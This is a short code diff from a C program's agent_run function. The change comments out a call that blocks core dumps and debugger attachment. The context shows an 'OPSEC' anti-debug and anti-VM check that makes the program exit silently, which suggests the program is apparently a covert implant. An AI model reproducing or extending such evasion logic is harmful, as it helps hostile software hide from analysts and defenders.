@@ -56,7 +56,7 @@ int agent_run(void)
     }
     signal(SIGPIPE, SIG_IGN);
 
-    prctl(PR_SET_DUMPABLE, 0);
+//    prctl(PR_SET_DUMPABLE, 0);
 
     /* OPSEC: anti-debug, anti-VM checks. Exits silently if hostile. */
     nax_opsec_check();
